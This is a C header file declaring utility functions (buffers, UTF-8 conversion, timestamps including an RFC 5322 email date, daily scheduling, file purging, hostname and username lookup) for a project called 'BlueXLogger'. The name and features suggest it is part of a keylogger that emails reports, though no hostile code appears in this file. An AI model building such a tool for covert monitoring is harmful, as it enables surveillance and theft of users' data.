/*============================================================================
 * BlueXLogger - bxl_util.h
 * Growable buffers, UTF-8 bridging, time, path and file helpers.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#ifndef BXL_UTIL_H
#define BXL_UTIL_H

#include "bxl_common.h"

/*==========================================================================
 * Growable byte buffer (always NUL-terminated, so it doubles as a string)
 *========================================================================*/
typedef struct BxlBuf {
    char  *data;
    size_t len;
    size_t cap;
} BxlBuf;

int  bxl_buf_init(BxlBuf *b, size_t initial_cap);
void bxl_buf_free(BxlBuf *b);
void bxl_buf_reset(BxlBuf *b);
int  bxl_buf_reserve(BxlBuf *b, size_t extra);
int  bxl_buf_append(BxlBuf *b, const void *data, size_t len);
int  bxl_buf_appends(BxlBuf *b, const char *s);
int  bxl_buf_appendc(BxlBuf *b, char c);
int  bxl_buf_appendf(BxlBuf *b, const char *fmt, ...);
int  bxl_buf_append_utf16(BxlBuf *b, const wchar_t *w);
int  bxl_buf_append_utf16n(BxlBuf *b, const wchar_t *w, size_t wlen);
/* Detach the internal pointer (caller frees with free()). */
char *bxl_buf_detach(BxlBuf *b, size_t *len_out);

/*==========================================================================
 * String helpers
 *========================================================================*/
void   bxl_str_trim(char *s);
size_t bxl_str_copy(char *dst, size_t dst_cch, const char *src);
int    bxl_str_ieq(const char *a, const char *b);
int    bxl_str_icontains(const char *hay, const char *needle);
int    bxl_str_startswith(const char *s, const char *prefix);
void   bxl_str_tolower(char *s);

/*==========================================================================
 * UTF-8 <-> UTF-16
 *========================================================================*/
int bxl_utf8_to_wide(const char *utf8, wchar_t *out, size_t out_cch);
int bxl_wide_to_utf8(const wchar_t *w, char *out, size_t out_cch);

/*==========================================================================
 * Time
 *========================================================================*/
bxl_u64 bxl_now_ms(void);                 /* monotonic milliseconds          */
bxl_u64 bxl_unix_time(void);              /* seconds since epoch             */

/* "2026-09-13 14:32:07" */
int bxl_format_timestamp(bxl_u64 unix_sec, char *out, size_t out_cch);
/* "20260913_143207" */
int bxl_format_timestamp_compact(bxl_u64 unix_sec, char *out, size_t out_cch);
/* "Sat, 13 Sep 2026 14:32:07 +0000" - RFC 5322 date header */
int bxl_format_rfc5322(bxl_u64 unix_sec, char *out, size_t out_cch);
/* Local wall-clock components for scheduling. */
void bxl_local_components(bxl_u64 unix_sec, int *year, int *month, int *day,
                          int *hour, int *minute, int *second, int *wday);
/* Epoch seconds for a local wall-clock time today (or tomorrow if already past). */
bxl_u64 bxl_next_daily_utc(int hour, int minute, bxl_u64 now_sec);

/*==========================================================================
 * Paths / files
 *========================================================================*/
int  bxl_path_exe(wchar_t *out, size_t out_cch);
int  bxl_path_temp_dir(wchar_t *out, size_t out_cch);
int  bxl_path_join(wchar_t *out, size_t out_cch, const wchar_t *dir,
                   const wchar_t *name);
int  bxl_dir_create(const wchar_t *dir);      /* recursive */
int  bxl_path_exists(const wchar_t *p);
int  bxl_file_append_flush(const wchar_t *path, const void *data, size_t len);
int  bxl_file_read_all(const wchar_t *path, BxlBuf *out);
bxl_u64 bxl_file_size(const wchar_t *path);
int  bxl_file_delete(const wchar_t *path);
int  bxl_file_mtime(const wchar_t *path, bxl_u64 *unix_out);
/* Delete files matching prefix in dir whose mtime is older than age_days. */
int  bxl_purge_old_files(const wchar_t *dir, const wchar_t *prefix,
                         bxl_u32 age_days, bxl_u32 *deleted_out);

/*==========================================================================
 * Machine identity
 *========================================================================*/
int bxl_hostname(char *out, size_t out_cch);
int bxl_username(char *out, size_t out_cch);

/*==========================================================================
 * Diagnostics
 *========================================================================*/
void bxl_log_enable_file(int enable);
void bxl_log_set_dir(const wchar_t *dir);
void bxl_logf(const char *fmt, ...);

#endif /* BXL_UTIL_H */
